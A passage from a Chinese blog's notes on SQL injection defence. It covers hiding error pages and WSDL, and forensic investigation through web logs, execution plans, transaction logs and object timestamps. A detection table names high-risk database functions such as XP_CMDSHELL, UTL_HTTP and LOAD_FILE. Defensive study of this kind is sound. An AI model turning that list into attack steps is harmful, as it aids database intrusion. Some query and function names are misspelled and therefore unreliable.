align="center">在web.xml文件中，使用<code>&lt;error-code&gt;</code>和<code>&lt;location&gt;</code>元素配置<code>&lt;error-page&gt;</code>元素：<br><error-page><br><error-code>500</error-code><br><location>/CustomPage.html</location><br></error-page><br>该配置只适用于专门由Java应用服务器处理的资源。只有当出现500错误时才会显示该配置页面。</td></tr><tr><td align="center">经典ASP/VBScript  Web应用程序</td><td align="center">必须对IIS进行配置以便隐藏详细的ASP错误消息。可以使用下列操作配置该设置：<br>1. 在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>2.在”Home Directory”选项卡中单击”Configuration”按钮。确保选中了”Send text error message to client”选项，并且该选项下的文本框中存在恰当的消息。</td></tr><tr><td align="center">PHP Web应用程序</td><td align="center">在php.ini文件中，设置display_errors为Off。此外，在Web服务器配置中配置默认的错误文档。请参考下面两行表格中针对Apache和 IIS的指令。</td></tr><tr><td align="center">Apache Web服务器</td><td align="center">向指向自定义页面的Apache（位于配置文件内部，通常为httpd.conf） 添加 ErrorDocument 指令：  <code>ErrorDocument 500 /CustomPage.html</code></td></tr><tr><td align="center">IIS服务器</td><td align="center">可以使用下列操作配置IIS中的自定义错误：<br>（1）在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>（2）在”Custom Errors”选项卡中单击”Configuration”按钮。选中需要自定义的HTTP错误并单击”Edit”按钮。接下来从”Message Type”<br>下拉菜单中选择一个文件或URL来替换默认内容</td></tr></tbody></table><p>一种可以使基于响应的错误检测变得困难的方法，是配置应用程序和Web服务器，使之返回相同的响应，比如不管什么错误代码（401、403、500等）均重定向到默认的首页。</p><h5 id="使用空的默认Web站点"><a href="#使用空的默认Web站点" class="headerlink" title="使用空的默认Web站点"></a>使用空的默认Web站点</h5><p>HTTP/1.1协议要求HTTP客户端在发送给Web服务器的请求中发送主机头部（Host header）。为访问特定的Web站点，该头部值必须与Web服务器的虚拟主机配置中的主机名相匹配。如果未找到匹配值，将返回默认的Web站点内容。</p><p>对于企业级Web应用程序的拥有者，则可能更喜欢隐蔽起来，他们不希望被针对端口80和443进行IP地址范围扫描的攻击者发现。为确保用户只能通过主机名连接到Web应用，需要将Web服务器的默认Web站点配置成返回一个空白的默认Web页面。</p><h5 id="为DNS反向查询使用虚拟主机名称"><a href="#为DNS反向查询使用虚拟主机名称" class="headerlink" title="为DNS反向查询使用虚拟主机名称"></a>为DNS反向查询使用虚拟主机名称</h5><p>前面讲过，如果只拥有IP地址，要想在能够访问Web站点之前发现有效的主机名，就需要花费一些功夫。要实现该目标，一种方法是在IP地址上执行反向DNS查询。如果IP地址被解析成在Web服务器上同样有效的主机名，那么我们就拥有了连接到该Web站点所需要的信息。不过，如果反向查询返回了稍微通用的内容，那么这时可通过反向DNS查询来阻止不受欢迎的攻击者发现我们的Web站点。如果正在使用虚拟主机名（Dummy Host Name）技术，请确保默认的Web站点也被配置成返回一个空白的默认Web页面。</p><h5 id="使用通配符SSL证书"><a href="#使用通配符SSL证书" class="headerlink" title="使用通配符SSL证书"></a>使用通配符SSL证书</h5><p>另一种发现有效主机名的方法是从SSL（Secure Sockets Layer,安全套接字层）证书中提取。 要阻止该操作，一种方法是使用通配符SSL证书。</p><h5 id="限制通过搜索引擎hacking得到的发现"><a href="#限制通过搜索引擎hacking得到的发现" class="headerlink" title="限制通过搜索引擎hacking得到的发现"></a>限制通过搜索引擎hacking得到的发现</h5><p>搜索引擎是攻击者用于寻找Web站点中SQL注入漏洞的另一种工具。在所有主流搜索引擎中，常见的技术是使用Web站点根目录中的robots.txt文件。该文件用于阻止爬行器（crawler）编写站点索引。</p><p>阻止所有机器人爬行Web站点上的所有页面：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *Disallow: /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="禁止WSDL信息"><a href="#禁止WSDL信息" class="headerlink" title="禁止WSDL信息"></a>禁止WSDL信息</h5><p>Web服务所支持的通信协议（例如，SOAP、HTTP GET等）、方法名和期望的参数，都可以从Web服务的WSDL（Web Services Description Language, Web服务描述语言）文件中提取到。通常，通过在Web服务URL的结尾添加一个?WSDL来调用该文件。好的做法是尽可能向不受欢迎的攻击者隐藏这一信息。</p><p>下面展示了如何配置一个.NET Web服务以便不显示WSDL，可以对该配置进行修改以便应用到应用的web.config或machine.config文件中：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>webServices</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>protocols</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Documentation<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>protocols</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>webServices</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Apache Axis（Java应用经常使用的一种SOAP（简单对象访问协议，Web服务平台）支持自定义配置WSDL文件，用于阻止自动生成WSDL，可以在服务的WSDD（Web服务描述文档）文件中配置wsdlFile设置以指向返回空<code>&lt;wsdl/&gt;</code>标签的文件。</p><p>坚决反对在面向Internet的Web服务器上保持WSDL信息的远程访问。可以使用可选的安全通信通道（比如加密过的e-mail）来向值得信赖的合作者提供该文件，合作者可能需要这些信息以与Web服务进行通信。</p><h4 id="提高Web服务器日志的详细程度"><a href="#提高Web服务器日志的详细程度" class="headerlink" title="提高Web服务器日志的详细程度"></a>提高Web服务器日志的详细程度</h4><p>Web服务器日志文件可以提供一些洞察潜在SQL注入攻击的信息，尤其是当应用程序日志记录机制不佳时。</p><h4 id="将Web服务器和数据库服务器分别部署在独立主机上"><a href="#将Web服务器和数据库服务器分别部署在独立主机上" class="headerlink" title="将Web服务器和数据库服务器分别部署在独立主机上"></a>将Web服务器和数据库服务器分别部署在独立主机上</h4><p>应该避免在同一主机上运行Web服务器软件和数据库服务器软件，因为这样会显著增加Web应用的攻击面，并将之前只访问Web前端时不可能暴露的数据库服务器软件暴露给攻击程序。</p><h4 id="配置网络访问控制"><a href="#配置网络访问控制" class="headerlink" title="配置网络访问控制"></a>配置网络访问控制</h4><p>在分层正确的网络中，数据库服务器通常位于内部受信任网络中。凭借对数据库服务器的直接访问权，攻击者可以尝试连接到同一网络的其他系统。 实现网络访问控制，以便对与内部网中其他系统的连接施加限制。可以在包含防火墙和路由器 ACL的网络层实现该控制，也可以使用IPSec这样的主机层机制来实现该控制。此外，确保施加合适的网络访问控制以阻止带外（outbound）网络连接。</p><h2 id="确认并从SQL注入攻击中恢复"><a href="#确认并从SQL注入攻击中恢复" class="headerlink" title="确认并从SQL注入攻击中恢复"></a>确认并从SQL注入攻击中恢复</h2><h3 id="调查可疑的SQL注入攻击"><a href="#调查可疑的SQL注入攻击" class="headerlink" title="调查可疑的SQL注入攻击"></a>调查可疑的SQL注入攻击</h3><p>在遇到可疑的攻击之后，调查者需要筛选大量信息，不但需要判断是否存在SQL注入攻击企图的证据，还需要判断这种攻击是否成功。</p><h4 id="取证的合理实践"><a href="#取证的合理实践" class="headerlink" title="取证的合理实践"></a>取证的合理实践</h4><p>收集和管理数字化的证据都有着严格的规则和指导原则。常见的要求包括：</p><ol><li><p>应该由接受过计算机取证培训并在机构中授权执行数字调查的人来处理调查事宜。</p></li><li><p>在调查期间收集的所有文件，应该镜像，并且应该创建镜像的副本用于分析。这可以确保在需要时总有原始镜像可用。</p></li><li><p>对于新创建的每一份文件镜像，应该为之生成哈希，对于每个源文件也是如此。</p></li><li><p>在调查期间，用文档记录你所执行的所有操作，包括那些当连接到数据库服务器时完成的操作：保留连接时间和所用数据库语境的记录；保留在RDBMS中执行命令的记录；将所有结果管道(pipe)重定向到文本文件中。主流RDBMS客户端将标准输出重定向的命令。</p></li><li><p>确保将所有证据都写入无毒的存储介质，并将其保存在一个安全的地方，比如储物柜或保险箱。</p></li><li><p>维护一份监管链(Chain of Custody)文档，用于跟踪收集的所有证据，从被防护时间开始直到作为证据在法庭上呈现时的移动、存放位置和所有者。</p></li></ol><p>主流RDBMS客户端重定向stdout的命令</p><table><thead><tr><th align="center">RDBMS</th><th align="center">厂商支持的客户端</th><th align="center">日志记录的会话活动</th><th align="center">重定向操作符</th></tr></thead><tbody><tr><td align="center">Microsoft  SQL Server</td><td align="center">SQLCMD</td><td align="center">-e命令，当启动SQLCMD时， 它在标准输出(stdout)上回显所有发送给服务器的语句和查询。例如：<br>  <code>SQLCMD  -e</code></td><td align="center">控制台中使用:out输出命令，将把标准输出(stdout)重定向到指定的文件。例如：<br><code>SQLCMD&gt;:out  z:\queryresults.txt  &lt;query&gt;  </code></td></tr><tr><td align="center">Oracle</td><td align="center">SQL*Plus</td><td align="center">在SQL*Plus中使用 ECHO  ON命令。例如：<br>  <code>SQL&gt; SET ECHO ON  </code></td><td align="center">在SQL*Plus中使用spool命令。  例如： <br> <code>SQL&gt; spool  z:\queryresults.txt</code></td></tr><tr><td align="center">MySQL</td><td align="center">MySQL命令行客户端</td><td align="center">Tee选项。  例如： <br><code>Tee z:\response\  logofactions.txt</code></td><td align="center">INTO OUTFILE 语句。  例如：<br>  <code>&lt;query&gt; INTO  OUTFILE z:\queryresults.txt</code></td></tr><tr><td align="center">PostgreSQL</td><td align="center">PostgreSQL  shell</td><td align="center">在 PostgreSQL  中使用  ECHO  选项。  例如：<br>  <code>\set ECHO all  </code></td><td align="center">在PostgreSQL  shell中使用/g参数。 例如：<br> <code>=# &lt;query&gt;  /g z:\queryresults.txt</code></td></tr></tbody></table><h4 id="分析数字化证据"><a href="#分析数字化证据" class="headerlink" title="分析数字化证据"></a>分析数字化证据</h4><p>数字化证据(digital artifact)就是相关数据的集合。它们的范围很广，包括从存储在操作系统中文件系统内的Web服务器的日志文件，到存储在内存中的信息，以及RDBMS内核中的信息。</p><h5 id="Web服务器日志文件"><a href="#Web服务器日志文件" class="headerlink" title="Web服务器日志文件"></a>Web服务器日志文件</h5><p>Web服务器是基于Web的应用程序的核心组件，作为交互层接受用户的输入并将输入传递给后台应用程序。Web服务器通常维护着持久日志文件，其中包含它接收到的页面请求的历史记录，以及以状态码形式记录的对该请求处理后产生的输出。</p><p>对于调查SQL注入攻击最有用的Web服务器日志属性</p><table><thead><tr><th align="center">日志字段名</th><th align="center">描述</th><th align="center">主要调查的值</th></tr></thead><tbody><tr><td align="center">Date</td><td align="center">活动的日期</td><td align="center">建立事件的时间基线，并在各种证据中将事件关联起来</td></tr><tr><td align="center">Time</td><td align="center">活动的时间</td><td align="center">建立事件的时间基线，并在各种证据中将事件关联起来</td></tr><tr><td align="center">Client-IP Address (c-ip)</td><td align="center">发起请求的客户端的IP地址</td><td align="center">标识Web请求的源</td></tr><tr><td align="center">Cs-UserName</td><td align="center">发起请求的已授权的用户名</td><td align="center">标识与流量关联的用户上下文(context)</td></tr><tr><td align="center">Cs-method</td><td align="center">请求的操作(action)</td><td align="center">客户端试图执行的HTTP操作</td></tr><tr><td align="center">Cs-uri-stem</td><td align="center">请求目标(例如请求的Web页面)</td><td align="center">客户端请求访问的资源(页面、可执行文件等)</td></tr><tr><td align="center">Cs-uri-query</td><td align="center">客户端请求的查询</td><td align="center">标识客户端提交的恶意查询</td></tr><tr><td align="center">Sc-status</td><td align="center">客户端请求的状态码</td><td align="center">标识处理客户端请求后产生的输出  (状态)</td></tr><tr><td align="center">Cs(User-Agent)</td><td align="center">客户端浏览器的版本</td><td align="center">追踪特定客户端的请求，该客户端可 能使用了多个IP地址</td></tr><tr><td align="center">Cs-bytes</td><td align="center">客户端发送给服务器的字节</td><td align="center">标识异常的流量传输</td></tr><tr><td align="center">Sc-bytes</td><td align="center">服务器发送给客户端的字节</td><td align="center">标识异常的流量传输</td></tr><tr><td align="center">Time Taken (time-taken)</td><td align="center">服务器执行请求所花的毫秒数</td><td align="center">标识异常请求处理的实例</td></tr></tbody></table><p>分析日志文件的要点</p><ul><li>每天的带宽利用率</li><li>页面每天命中次数</li><li>页面每天被每个IP命中的次数</li><li>恶意查询参数</li><li>spear-searching</li></ul><h5 id="数据库执行计划"><a href="#数据库执行计划" class="headerlink" title="数据库执行计划"></a>数据库执行计划</h5><p>数据库执行计划是由RDBMS生成的执行步骤的列表，它说明了 RDBMS在访问或修改信息时效率最高的方式。</p><h6 id="在缓存的执行计划中查找证据"><a href="#在缓存的执行计划中查找证据" class="headerlink" title="在缓存的执行计划中查找证据"></a>在缓存的执行计划中查找证据</h6><ul><li>寻找已知恶意攻击活动的痕迹</li><li>与注释协同使用的堆叠查询</li><li>非法使用条件语句</li><li>高风险语句和数据库函数</li></ul><table><thead><tr><th>数据库</th><th>函  数</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>XP_CMDSHELL<br>XP_reg*<br>SP_OACREATE<br>sp_OAMethod<br>OPENROWSET<br>sp_configure<br>BULK INSERT<br>BCP<br>WAITFOR DELAY</td></tr><tr><td>Oracle</td><td>UTL_FILE<br>UTL_HTTP<br>HTTPURITYPE<br>UTL_INADDR</td></tr><tr><td>MySQL</td><td>LOAD_DATA_INFILE<br>LOAD_FILE<br>BENCHMARK<br>ENCODE()<br>OUTFILE()<br>CONCAT()</td></tr><tr><td>PostgreSQL</td><td>pg_Is_dir<br>pg_read_file<br>pg_read_binary_file<br>pg_stat_file<br>pg_sleep</td></tr></tbody></table><h6 id="如何访问执行计划"><a href="#如何访问执行计划" class="headerlink" title="如何访问执行计划"></a>如何访问执行计划</h6><p>RDBMS数据库提供的视图，用于访问存储的执行计划</p><table><thead><tr><th>数据库</th><th>缓存的语句类型</th><th align="center">默认是否启用</th><th>访问方法</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>即席奪询(ad  hoc)和预处理语句(prepared  statement)</td><td align="center">启用</td><td>sys.dmexecquerystats  sys.dmexecsqltext</td></tr><tr><td>Oracle</td><td>即席查询（ad hoc）和预处理语句</td><td align="center">启用</td><td>gv$sql</td></tr><tr><td>MySQL</td><td>预处理语句</td><td align="center">不启用</td><td>没有直接访问方法，使用普通的日志查询</td></tr><tr><td>PostgreSQL</td><td>预处理语句</td><td align="center">不启用</td><td>没有直接访问方法，使用普通的日志查询</td></tr></tbody></table><ul><li>Microsoft SQL Server</li></ul><p>  使用视图返回了执行计划缓存条目创建的日期和时间、最后一次执行的时间（在重复执行的情况下）、执行的语法和执行计划被重用的次数</p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> creation_time<span class="token punctuation">,</span> last_execution_time<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> execution_count <span class="token keyword">from</span> sys<span class="token punctuation">.</span>dm_exec_query_stats qs <span class="token keyword">CROSS</span> <span class="token keyword">APPLY</span> sys<span class="token punctuation">.</span>dm_exec_sql_text<span class="token punctuation">(</span>qs<span class="token punctuation">.</span>sql_handle<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>Oracle </p><p>使用GVSSQL视图</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sql_text <span class="token keyword">from</span> gv$<span class="token keyword">sql</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>MySQL</p><p>使用show variables命令来查看查询日志的状态</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%general_log%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>PostgreSQL</p><p>使用下面的查询来判断服务器上的log_statement值是否已经启用，如果已经启用，可以看到曰志的位置</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> setting <span class="token keyword">from</span> pg_settings <span class="token keyword">where</span> name <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'log_statement'</span><span class="token punctuation">,</span><span class="token string">'log_directory'</span><span class="token punctuation">,</span><span class="token string">'log_filename'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h6 id="执行计划的局限"><a href="#执行计划的局限" class="headerlink" title="执行计划的局限"></a>执行计划的局限</h6><p>在PostgreSQL和MySQL中，执行计划默认是被禁用的。除此之外，具有足够权限的攻击者还可以禁用执行计划。Microsoft SQL Server和Oracle不允许禁用执行计划，但是执行计划受到本地RDBMS回收策略的支配，使用特殊的RDBMS函数可以将执行计划清洗掉。</p><h6 id="缓存回收策略"><a href="#缓存回收策略" class="headerlink" title="缓存回收策略"></a>缓存回收策略</h6><p>可以控制执行计划缓存的存储容量。RDBMS会根据一些因素来清除缓存的条目</p><ul><li><p>数据库服务器的CPU和内存负载</p></li><li><p>执行计划重用的频率</p></li><li><p>缓存执行计划中引用的对象发生了改变</p></li><li><p>重启数据库服务</p></li></ul><h6 id="手工清洗缓存"><a href="#手工清洗缓存" class="headerlink" title="手工清洗缓存"></a>手工清洗缓存</h6><p>具有管理员权限的用户可以使用手工方式清洗数据库的执行计划缓存。</p><p>采用参数化处理可以提高RDBMS重用缓存计划的机会，以便将来遇到同样的查询时可以更快地执行。下面是一个参数化查询的例子：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> EmployeeID<span class="token punctuation">,</span> FName<span class="token punctuation">,</span> LName<span class="token punctuation">,</span> YOB <span class="token keyword">from</span> SSFA<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> <span class="token punctuation">[</span>fname<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'mike'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h5><p>数据库操作分为两个主要的类别：一是数据操作语言(Data Manipulation Language, DML)， 二是数据定义语言(Data Definition Language, DDL)。DML作用于表内的数据；而DDL则作用于数据库的结构，比如创建新表。</p><p>事务日志(transaction log)用于记录这样的事实：事务开始发生及恢复所需的信息。万一数据库服务器将信息写入硬盘失败，数据库服务器就可以使用这些恢复信息将数据回退到某个一致的状态。</p><p>将数据写入实际的数据页(data page)并不是实时发生的。在预定义的时间间隔之后，事务 日志中的信息才会应用于硬盘，这等同于数据的写入操作，但却提高了总体的性能。这听起来 很复杂，但与RDBMS在巨大的数据库文件中寻道并在恰当区域中写入信息相比，写入事务曰 志的速度要快许多。</p><h6 id="在事务日志中查找证据"><a href="#在事务日志中查找证据" class="headerlink" title="在事务日志中查找证据"></a>在事务日志中查找证据</h6><p>分析事务日志</p><ul><li><p>在可疑攻击时间段内执行的INSERT, UPDATE和DELETE语句。在调查取证时，该信息可用于标识在所调查的时间段内执行的活动，以及相关事件的其他痕迹。</p></li><li><p>数据库用户执行的非标准的数据库操作(当事务日志中有可用信息时)。例如，某个通常从数据库读取信息的应用程序用户账号突然意外地开始执行INSERT、UPDATE和 DELETE 语句。</p></li></ul><h6 id="如何搜索主流RDBMS的事务日志"><a href="#如何搜索主流RDBMS的事务日志" class="headerlink" title="如何搜索主流RDBMS的事务日志"></a>如何搜索主流RDBMS的事务日志</h6><ul><li><p>Microsoft SQL Server </p><p>默认情况下，Microsoft SQL Server的事务日志功能是启用的，而且无法禁用。从任何SQL Server客户端，都可以使用原生的fh_dblog函数来访问事务日志。</p><p>列出了针对用户表已经执行事务的汇总信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> AllocUnitName <span class="token keyword">as</span> <span class="token string">'Object'</span><span class="token punctuation">,</span> Operation<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>OPERATION<span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token string">'Count'</span> <span class="token keyword">from</span> fn_dblog<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'LOP_INSERT_ROWS'</span><span class="token punctuation">,</span><span class="token string">'LOP_MODIFY_ROW'</span><span class="token punctuation">,</span><span class="token string">'LOP_DELETE_ROWS'</span><span class="token punctuation">)</span> <span class="token operator">and</span> AllocUnitName <span class="token operator">NOT</span><span class="token operator">Like</span> <span class="token string">'sys.%'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> Operation<span class="token punctuation">,</span> AllocUnitName <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> Object<span class="token punctuation">,</span> Operation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>Oracle</p><p>在Oracle中，事务(归档)日志默认是启用的，并且在测试系统时也无法禁用事务日志功能。</p><p>使用下面的查询返回已执行的INSERT、UPDATE和DELETE操作的一个列表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> OPERATION<span class="token punctuation">,</span> SQL_REDO<span class="token punctuation">,</span> SQL_UNDO <span class="token keyword">FROM</span> V$LOGMNR_CONTENTS <span class="token keyword">WHERE</span>SEG_OWNER <span class="token operator">=</span> <span class="token string">'WEBAPP'</span> <span class="token operator">AND</span> SEG_NAME <span class="token operator">=</span> <span class="token string">'SYNGRESS'</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&gt;</span> sysdate <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&lt;</span> sysdate<span class="token punctuation">)</span> <span class="token operator">AND</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span><span class="token string">'INSERT'</span><span class="token punctuation">,</span> <span class="token string">'UPDATE'</span><span class="token punctuation">)</span><span class="token operator">AND</span> USERNAME <span class="token operator">=</span> <span class="token string">'KEWIE'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>MySQL</p><p>在MySQL中，默认情况下不启用事务日志，为了记录事务，必须用命令启用事务日志功能。</p><p>使用show binary logs语句来查看是否激活了事务日志功能</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">BINARY</span> LOGS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用下面的查询来确定事务日志存储的位置</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%HOME%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何返回DB_BIN_Log.000002文件中的所有事务记录</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysqlbinlog <span class="token string">"c:\Program Files\MySQL\DB_Bin_Logs.000002"</span> <span class="token operator">&gt;</span> z:\transactionlog<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>PostgreSQL</p><p>可以使用PostgreSQL命令行客户端来返回事务日志信息。在PostgreSQL中，事务日志默认是不启用的，在启用了 PostgreSQL的事务日志之后，也可以再将其禁用。</p></li></ul><h5 id="数据库对象的时间戳"><a href="#数据库对象的时间戳" class="headerlink" title="数据库对象的时间戳"></a>数据库对象的时间戳</h5><p>在调查取证期间，生成关键对象和相应时间戳的列表是个好办法，这可以在可疑攻击时间段内标识对象的创建和修改活动。在调查可疑的SQL注入攻击时，请注意下列常常与攻击有关的活动：</p><ul><li><p>创建用户账号，这通常用于创建访问的后门。</p></li><li><p>为已有账号增加权限，这通常是执行权限提升的一部分操作。 </p></li><li><p>创建表，新创建的表通常用于在将信息返回给攻击者之前，存储中间结果。</p></li></ul><h6 id="SQL-Server-4"><a href="#SQL-Server-4" class="headerlink" title="SQL Server"></a>SQL Server</h6><p>下面的查询将返回当前数据库中视图、过程、函数、表和扩展过程的一个列表，并按照修改日期和创建日期以降序方式排序：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> sob<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'object'</span><span class="token punctuation">,</span> sch<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'schema'</span><span class="token punctuation">,</span> type_desc<span class="token punctuation">,</span> create_date<span class="token punctuation">,</span> modify_date <span class="token keyword">from</span> sys<span class="token punctuation">.</span>all_objects sob<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>schemas sch <span class="token keyword">WHERE</span> sob<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> sch<span class="token punctuation">.</span>schema_id <span class="token operator">and</span> sob<span class="token punctuation">.</span><span class="token keyword">type</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'FN'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'IT'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'Db_User'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysusers<span class="token punctuation">)</span> <span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>syslogins<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Oracle-8"><a href="#Oracle-8" class="headerlink" title="Oracle"></a>Oracle</h6><p>在Oracle中，可以使用下面的查询返回当前数据库中数据库对象类型的一个列表，比如表、视图和过程，并按照修改日期和创建日期以降序方式排序：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> object_name<span class="token punctuation">,</span> object_id<span class="token punctuation">,</span> object_type<span class="token punctuation">,</span> created<span class="token punctuation">,</span> last_DDL_time <span class="token keyword">from</span> dba_objects <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LAST_DDL_time <span class="token keyword">DESC</span><span class="token punctuation">,</span> created <span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="MySQL-3"><a href="#MySQL-3" class="headerlink" title="MySQL"></a>MySQL</h6><p>当使用MySQL数据库时，应该注意对于某些对象比如触发器和视图并不存储时间戳。运行下面的查询，没有时间戳的对象将返回NULL值作为时间戳列的值</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">as</span> <span class="token string">"OBJECT"</span><span class="token punctuation">,</span> TABLE_SCHEMA <span class="token keyword">as</span> <span class="token string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span>TABLE_TYPE <span class="token keyword">as</span> <span class="token string">"OBJECT_TYPE"</span><span class="token punctuation">,</span> CREATE_TIME<span class="token punctuation">,</span> UPDATE_TIME <span class="token keyword">from</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> SPECIFIC_NAME<span class="token punctuation">,</span> ROUTINE_SCHEMA<span class="token punctuation">,</span> ROUTINE_TYPEZ CREATED<span class="token punctuation">,</span> LAST_ALTERED <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>routines <span class="token keyword">WHERE</span> ROUTINE_TYPE <span class="token operator">=</span><span class="token string">'PROCEDURE'</span><span class="token punctuation">)</span><span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">User</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="PostgreSQL-6"><a href="#PostgreSQL-6" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h6><p>对于创建的对象、表和用户等，PostgreSQL并不记录它们的时间戳信息。可以使用下面的查询，返回当前数据库中关键对象的名称、模式和类型。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> proname <span class="token keyword">as</span> <span class="token string">"OBJECT_NAME"</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token keyword">as</span> <span class="token 